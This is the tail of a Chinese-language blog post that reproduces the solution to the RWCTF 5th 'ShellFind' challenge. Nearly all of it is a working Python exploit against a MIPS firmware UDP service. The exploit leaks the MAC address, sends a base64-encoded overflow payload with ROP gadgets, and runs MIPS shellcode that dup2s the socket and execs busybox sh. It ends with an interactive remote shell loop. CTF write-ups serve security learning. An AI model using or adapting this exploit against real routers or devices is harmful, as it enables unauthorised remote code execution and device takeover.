class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'192.168.10.108'</span></span><br><span class="line">port = <span class="number">62720</span></span><br><span class="line"></span><br><span class="line">r = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">lg(<span class="string">'[+] open connection'</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'FIVI'</span></span><br><span class="line">p1 += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\n'</span></span><br><span class="line">p1 += <span class="string">b'\x01\x00'</span></span><br><span class="line">p1 += <span class="string">b'\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\xff'</span> * <span class="number">6</span></span><br><span class="line">p1 += <span class="string">b'\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line">r.sendto(p1, (ip, port))</span><br><span class="line"></span><br><span class="line">recv_data, recv_addr = r.recvfrom(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getmac</span>(<span class="params">mac_addr</span>):</span><br><span class="line">    hex_str = binascii.hexlify(mac_addr).decode()</span><br><span class="line">    mac_addr = <span class="string">':'</span>.join([hex_str[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>)])</span><br><span class="line">    li(<span class="string">'[+] mac = '</span> + <span class="built_in">str</span>(mac_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(recv_data) == <span class="number">0x21d</span>):</span><br><span class="line">    mac_addr = recv_data[<span class="number">0x11</span>:<span class="number">0x17</span>]</span><br><span class="line">    getmac(mac_addr)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ll(<span class="string">"[-] recv error"</span>)</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'FIVI'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\n'</span></span><br><span class="line">p2 += <span class="string">b'\x02\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x00\x00\x00\x00\x00\x00'</span></span><br><span class="line">p2 += mac_addr</span><br><span class="line">p2 += <span class="string">b'\x00\x00'</span></span><br><span class="line">p2 += <span class="string">b'\x8E'</span></span><br><span class="line">p2 = p2.ljust(<span class="number">0x5d</span>, <span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b'\x00'</span> * <span class="number">588</span></span><br><span class="line">p3 += p32(<span class="number">0x004020A4</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:004020A4 8F BC 00 18                   lw      $gp, 0x7C+var_64($sp)</span></span><br><span class="line"><span class="string">.text:004020A8 8F 99 80 38                   la      $t9, close</span></span><br><span class="line"><span class="string">.text:004020AC 03 20 F8 09                   jalr    $t9 ; close</span></span><br><span class="line"><span class="string">.text:004020B0 02 00 20 21                   move    $a0, $s0                         # fd</span></span><br><span class="line"><span class="string">.text:004020B0</span></span><br><span class="line"><span class="string">.text:004020B4</span></span><br><span class="line"><span class="string">.text:004020B4                               loc_4020B4:                              # CODE XREF: sub_401DF4+1AC↑j</span></span><br><span class="line"><span class="string">.text:004020B4                                                                        # sub_401DF4+238↑j</span></span><br><span class="line"><span class="string">.text:004020B4                                                                        # sub_401DF4+284↑j</span></span><br><span class="line"><span class="string">.text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)</span></span><br><span class="line"><span class="string">.text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)</span></span><br><span class="line"><span class="string">.text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)</span></span><br><span class="line"><span class="string">.text:004020C0 03 E0 00 08                   jr      $ra</span></span><br><span class="line"><span class="string">.text:004020C4 27 BD 00 88                   addiu   $sp, 0x88</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">0x18</span></span><br><span class="line">p3 += p32(<span class="number">0x41B030</span>) <span class="comment"># gp</span></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">0x68</span></span><br><span class="line">p3 += p32(<span class="number">0x00401F98</span>)   <span class="comment"># ra</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00401F98 0C 10 04 F4                   jal     my_puts</span></span><br><span class="line"><span class="string">.text:00401F9C 24 84 2C F8                   li      $a0, aCanTGetHelloSo             # "Can't get hello socket\n"</span></span><br><span class="line"><span class="string">.text:00401F9C</span></span><br><span class="line"><span class="string">.text:00401FA0 10 00 00 44                   b       loc_4020B4</span></span><br><span class="line"><span class="string">.text:00401FA4 00 00 00 00                   nop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">my_puts</span></span><br><span class="line"><span class="string">.text:004013D0 addiu   $sp, -0x10</span></span><br><span class="line"><span class="string">.text:004013D4 sw      $a1, 0x10+arg_4($sp)</span></span><br><span class="line"><span class="string">.text:004013D8 sw      $a2, 0x10+arg_8($sp)</span></span><br><span class="line"><span class="string">.text:004013DC sw      $a3, 0x10+arg_C($sp)</span></span><br><span class="line"><span class="string">.text:004013E0 addiu   $v0, $sp, 0x10+arg_4</span></span><br><span class="line"><span class="string">.text:004013E4 sw      $v0, 0x10+var_8($sp)</span></span><br><span class="line"><span class="string">.text:004013E8 addiu   $sp, 0x10</span></span><br><span class="line"><span class="string">.text:004013EC jr      $ra</span></span><br><span class="line"><span class="string">.text:004013F0 nop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">loc_4020B4</span></span><br><span class="line"><span class="string">.text:004020B4 8F BF 00 84                   lw      $ra, 0x7C+var_s8($sp)</span></span><br><span class="line"><span class="string">.text:004020B8 8F B1 00 80                   lw      $s1, 0x7C+var_s4($sp)</span></span><br><span class="line"><span class="string">.text:004020BC 8F B0 00 7C                   lw      $s0, 0x7C+var_s0($sp)</span></span><br><span class="line"><span class="string">.text:004020C0 03 E0 00 08                   jr      $ra</span></span><br><span class="line"><span class="string">.text:004020C4 27 BD 00 88                   addiu   $sp, 0x88</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">0x10</span></span><br><span class="line">p3 += <span class="string">b'\x10\x00\x00\x30'</span> <span class="comment"># b 0xC4</span></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">0x68</span></span><br><span class="line">p3 += p32(<span class="number">0x00413200</span> - <span class="number">0xd</span>) <span class="comment"># s0</span></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">4</span> <span class="comment"># s1</span></span><br><span class="line">p3 += p32(<span class="number">0x00400C9C</span>)     <span class="comment"># ra</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00400c9c : lw $gp, 0x10($sp) ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20</span></span><br><span class="line"></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">0x10</span></span><br><span class="line">p3 += p32(<span class="number">0x41B030</span>) <span class="comment"># gp</span></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">8</span></span><br><span class="line">p3 += p32(<span class="number">0x00400F28</span>) <span class="comment"># ra</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00400F28 AE 02 00 0D                   sw      $v0, 0xD($s0)</span></span><br><span class="line"><span class="string">.text:00400F28</span></span><br><span class="line"><span class="string">.text:00400F2C</span></span><br><span class="line"><span class="string">.text:00400F2C                               loc_400F2C:                              # CODE XREF: sub_400E50+CC↑j</span></span><br><span class="line"><span class="string">.text:00400F2C 8F 82 80 68                   la      $v0, ifname</span></span><br><span class="line"><span class="string">.text:00400F30 8C 44 00 00                   lw      $a0, (ifname - 0x413138)($v0)</span></span><br><span class="line"><span class="string">.text:00400F34 8F 99 80 8C                   la      $t9, net_get_hwaddr</span></span><br><span class="line"><span class="string">.text:00400F38 03 20 F8 09                   jalr    $t9 ; net_get_hwaddr</span></span><br><span class="line"><span class="string">.text:00400F3C 26 05 00 11                   addiu   $a1, $s0, 0x11</span></span><br><span class="line"><span class="string">.text:00400F3C</span></span><br><span class="line"><span class="string">.text:00400F40 8F BF 00 24                   lw      $ra, 0x20+var_s4($sp)</span></span><br><span class="line"><span class="string">.text:00400F44 8F B0 00 20                   lw      $s0, 0x20+var_s0($sp)</span></span><br><span class="line"><span class="string">.text:00400F48 03 E0 00 08                   jr      $ra</span></span><br><span class="line"><span class="string">.text:00400F4C 27 BD 00 28                   addiu   $sp, 0x28</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p3 += <span class="string">b'\x00'</span> * <span class="number">0x20</span></span><br><span class="line">p3 += p32(<span class="number">0x00413200</span>)     <span class="comment"># s0</span></span><br><span class="line">p3 += p32(<span class="number">0x004027C8</span>)     <span class="comment"># ra</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b'\x00'</span> * <span class="number">0x20</span></span><br><span class="line">shellcode+= <span class="string">b"\x3C\x1C\x00\x42"</span>        <span class="comment"># lui   $gp, 0x42</span></span><br><span class="line">shellcode+= <span class="string">b"\x27\x9C\xB0\x30"</span>        <span class="comment"># addiu $gp, $gp, -0x4fd0</span></span><br><span class="line">shellcode+= <span class="string">b"\x8F\x82\x80\xB8"</span>        <span class="comment"># la      $v0, server_sockfd</span></span><br><span class="line">shellcode+= <span class="string">b"\x8C\x44\x00\x00"</span>        <span class="comment"># lw      $a0, (server_sockfd - 0x413134)($v0)  # fd</span></span><br><span class="line">shellcode+= <span class="string">b"\x8F\x85\x80\xF4"</span>        <span class="comment"># lw $a1, -0x7f0c($gp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x24\x0c\xff\xef"</span>        <span class="comment"># li      t4,-17 ( addrlen = 16 )</span></span><br><span class="line">shellcode+= <span class="string">b"\x01\x80\x30\x27"</span>        <span class="comment"># nor     a2,t4,zero</span></span><br><span class="line">shellcode+= <span class="string">b"\x24\x02\x10\x4a"</span>        <span class="comment"># li      v0,4170 ( sys_connect )</span></span><br><span class="line">shellcode+= <span class="string">b"\x01\x01\x01\x0c"</span>        <span class="comment"># syscall 0x40404</span></span><br><span class="line"></span><br><span class="line">shellcode+= <span class="string">b"\x3C\x1C\x00\x42"</span>        <span class="comment"># lui   $gp, 0x42</span></span><br><span class="line">shellcode+= <span class="string">b"\x27\x9C\xB0\x30"</span>        <span class="comment"># addiu $gp, $gp, -0x4fd0</span></span><br><span class="line">shellcode+= <span class="string">b"\x8F\x82\x80\xB8"</span>        <span class="comment"># la      $v0, server_sockfd</span></span><br><span class="line">shellcode+= <span class="string">b"\x8C\x44\x00\x00"</span>        <span class="comment"># lw      $a0, (server_sockfd - 0x413134)($v0)  # fd</span></span><br><span class="line"></span><br><span class="line">shellcode+= <span class="string">b"\x24\x0f\xff\xfd"</span>        <span class="comment"># li      t7,-3</span></span><br><span class="line">shellcode+= <span class="string">b"\x01\xe0\x28\x27"</span>        <span class="comment"># nor     a1,t7,zero</span></span><br><span class="line"><span class="comment">#shellcode+= b"\x8f\xa4\xff\xff"        # lw      a0,-1(sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x24\x02\x0f\xdf"</span>        <span class="comment"># li      v0,4063 ( sys_dup2 )</span></span><br><span class="line">shellcode+= <span class="string">b"\x01\x01\x01\x0c"</span>        <span class="comment"># syscall 0x40404</span></span><br><span class="line">shellcode+= <span class="string">b"\x20\xa5\xff\xff"</span>        <span class="comment"># addi    a1,a1,-1</span></span><br><span class="line">shellcode+= <span class="string">b"\x24\x01\xff\xff"</span>        <span class="comment"># li      at,-1</span></span><br><span class="line">shellcode+= <span class="string">b"\x14\xa1\xff\xfb"</span>        <span class="comment"># bne     a1,at, dup2_loop</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve /bin/busybox sh</span></span><br><span class="line">shellcode+= <span class="string">b"\x28\x06\xFF\xFF"</span>        <span class="comment"># slti    $a2, $zero, -1</span></span><br><span class="line">shellcode+= <span class="string">b"\x3C\x0F\x2F\x62"</span>        <span class="comment"># lui     $t7, 0x2f62</span></span><br><span class="line">shellcode+= <span class="string">b"\x35\xEF\x69\x6E"</span>        <span class="comment"># ori     $t7, $t7, 0x696e</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xAF\xFF\xDC"</span>        <span class="comment"># sw      $t7, -0x24($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x3C\x0F\x2F\x62"</span>        <span class="comment"># lui     $t7, 0x2f62</span></span><br><span class="line">shellcode+= <span class="string">b"\x35\xEF\x75\x73"</span>        <span class="comment"># ori     $t7, $t7, 0x7573</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xAF\xFF\xE0"</span>        <span class="comment"># sw      $t7, -0x20($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x3C\x0F\x79\x62"</span>        <span class="comment"># lui     $t7, 0x7962</span></span><br><span class="line">shellcode+= <span class="string">b"\x35\xEF\x6F\x78"</span>        <span class="comment"># ori     $t7, $t7, 0x6f78</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xAF\xFF\xE4"</span>        <span class="comment"># sw      $t7, -0x1c($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xA0\xFF\xE8"</span>        <span class="comment"># sw      $zero, -0x18($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x3C\x0F\x73\x68"</span>        <span class="comment"># lui     $t7, 0x7368</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xAF\xFF\xEC"</span>        <span class="comment"># sw      $t7, -0x14($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xA0\xFF\xF0"</span>        <span class="comment"># sw      $zero, -0x10($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x27\xAF\xFF\xDC"</span>        <span class="comment"># addiu   $t7, $sp, -0x24</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xAF\xFF\xF4"</span>        <span class="comment"># sw      $t7, -0xc($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x27\xAF\xFF\xEC"</span>        <span class="comment"># addiu   $t7, $sp, -0x14</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xAF\xFF\xF8"</span>        <span class="comment"># sw      $t7, -8($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\xAF\xA0\xFF\xFC"</span>        <span class="comment"># sw      $zero, -4($sp)</span></span><br><span class="line">shellcode+= <span class="string">b"\x27\xA4\xFF\xDC"</span>        <span class="comment"># addiu   $a0, $sp, -0x24</span></span><br><span class="line">shellcode+= <span class="string">b"\x27\xA5\xFF\xF8"</span>        <span class="comment"># addiu   $a1, $sp, -8</span></span><br><span class="line">shellcode+= <span class="string">b"\x24\x02\x0F\xAB"</span>        <span class="comment"># addiu   $v0, $zero, 0xfab</span></span><br><span class="line">shellcode+= <span class="string">b"\x01\x01\x01\x0C"</span>        <span class="comment"># syscall 0x40404</span></span><br><span class="line"></span><br><span class="line">p3 += shellcode</span><br><span class="line"></span><br><span class="line">p2 += base64.b64encode(p3)</span><br><span class="line">li(p2)</span><br><span class="line"></span><br><span class="line">r.sendto(p2, (ip, port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	command = <span class="built_in">input</span>(<span class="string">"shell # "</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> command:</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">"exit"</span> <span class="keyword">in</span> command:</span><br><span class="line">		r.close()</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	command += <span class="string">"\n"</span></span><br><span class="line">	r.sendto(command.encode(), (ip, port))</span><br><span class="line">	recv_data, recv_addr = r.recvfrom(<span class="number">4096</span>)</span><br><span class="line">	li(recv_data.decode())</span><br></pre></td></tr></tbody></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>综合性的利用，对自己的提升非常有帮助，漏洞利用不只这一种方法，还有其他的，比如控制一参命令，调用system</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&amp;mid=2247490825&amp;idx=1&amp;sn=9f8faeb2cd148f7b8645077385f6f861&amp;chksm=96f40264a1838b72964115c047743625555bd8635eb50a5b5507fa5d07afe663d9b59d8c636a&amp;mpshare=1&amp;scene=23&amp;srcid=01117AjQKN18fHXiXpvgTlhC&amp;sharer_sharetime=1673411100292&amp;sharer_shareid=b7aefdcb4bc4f30843f7570c11bdc5aa#rd">https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&amp;mid=2247490825&amp;idx=1&amp;sn=9f8faeb2cd148f7b8645077385f6f861&amp;chksm=96f40264a1838b72964115c047743625555bd8635eb50a5b5507fa5d07afe663d9b59d8c636a&amp;mpshare=1&amp;scene=23&amp;srcid=01117AjQKN18fHXiXpvgTlhC&amp;sharer_sharetime=1673411100292&amp;sharer_shareid=b7aefdcb4bc4f30843f7570c11bdc5aa#rd</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/SSDcTz9ZqBDWIhI0gsp7UA">https://mp.weixin.qq.com/s/SSDcTz9ZqBDWIhI0gsp7UA</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">RWCTF 5th ShellFind复现笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%BF%9C%E7%A8%8B%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">题目远程环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">初步分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-40172C"><span class="toc-number">1.3.1.</span> <span class="toc-text">sub_40172C</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-4013F4"><span class="toc-number">1.3.2.</span> <span class="toc-text">sub_4013F4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub-400F50"><span class="toc-number">1.3.3.</span> <span class="toc-text">sub_400F50</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.4.</span> <span class="toc-text">固件模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.7.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;text=RWCTF 5th ShellFind复现笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;title=RWCTF 5th ShellFind复现笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;is_video=false&amp;description=RWCTF 5th ShellFind复现笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RWCTF 5th ShellFind复现笔记&amp;body=Check out this article: http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;title=RWCTF 5th ShellFind复现笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;title=RWCTF 5th ShellFind复现笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;title=RWCTF 5th ShellFind复现笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;title=RWCTF 5th ShellFind复现笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;name=RWCTF 5th ShellFind复现笔记&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/&amp;t=RWCTF 5th ShellFind复现笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright ©
    
    
    2021-2024
    z1r0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->



<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>